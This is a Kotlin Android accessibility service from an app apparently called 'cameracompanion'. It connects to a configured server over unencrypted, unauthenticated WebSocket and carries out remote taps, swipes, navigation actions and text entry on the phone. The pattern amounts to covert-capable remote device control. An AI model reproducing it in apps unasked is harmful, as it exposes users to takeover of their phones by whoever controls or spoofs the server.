package com.artem.cameracompanion

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.hardware.display.DisplayManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class ControlService : AccessibilityService() {

    private var ws: WebSocket? = null
    private val handler = Handler(Looper.getMainLooper())
    private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()

    private val serverBase: String get() {
        var host = BuildConfig.DEFAULT_SERVER.trim()
        if (host.isEmpty()) return ""
        host = host.removePrefix("http://").removePrefix("ws://")
        if (!host.contains(":")) host = "$host:80"
        return "ws://$host"
    }

    override fun onServiceConnected() {
        connectControlWs()
    }

    private fun connectControlWs() {
        val base = serverBase
        if (base.isEmpty()) return
        val model = Uri.encode(Build.MODEL ?: "Android")
        val url = "$base/control?role=phone&model=$model"
        http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                this@ControlService.ws = ws
            }
            override fun onMessage(ws: WebSocket, text: String) {
                try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
            }
            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                this@ControlService.ws = null
                handler.postDelayed({ connectControlWs() }, 5000)
            }
            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                this@ControlService.ws = null
                handler.postDelayed({ connectControlWs() }, 5000)
            }
        })
    }

    private fun handleMessage(msg: JSONObject) {
        when (msg.getString("type")) {
            "tap" -> performTap(msg.getDouble("x").toFloat(), msg.getDouble("y").toFloat())
            "swipe" -> performSwipe(
                msg.getDouble("x1").toFloat(), msg.getDouble("y1").toFloat(),
                msg.getDouble("x2").toFloat(), msg.getDouble("y2").toFloat(),
                msg.optLong("ms", 200)
            )
            "key" -> performKey(msg.optString("name", ""))
            "text" -> typeText(msg.optString("text", ""))
        }
    }

    private fun screenSize(): Pair<Int, Int> {
        val dm = getSystemService(DISPLAY_SERVICE) as DisplayManager
        val display = dm.getDisplay(Display.DEFAULT_DISPLAY) ?: return Pair(1080, 1920)
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        return Pair(metrics.widthPixels, metrics.heightPixels)
    }

    private fun performTap(nx: Float, ny: Float) {
        val (w, h) = screenSize()
        val path = Path().apply { moveTo(nx * w, ny * h) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 100)
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    private fun performSwipe(nx1: Float, ny1: Float, nx2: Float, ny2: Float, ms: Long) {
        val (w, h) = screenSize()
        val path = Path().apply {
            moveTo(nx1 * w, ny1 * h)
            lineTo(nx2 * w, ny2 * h)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, maxOf(1L, ms))
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    private fun performKey(name: String) {
        when (name) {
            "BACK" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "HOME" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "RECENTS" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "NOTIFICATIONS", "NOTIFS" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
        }
    }

    private fun typeText(text: String) {
        // Type character by character using individual tap gestures is not feasible via accessibility;
        // instead we use the clipboard approach via text injection into focused node
        val node = rootInActiveWindow ?: return
        val args = Bundle()
        args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        node.recycle()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    override fun onUnbind(intent: Intent?): Boolean {
        ws?.close(1000, "service stopped")
        ws = null
        return super.onUnbind(intent)
    }
}
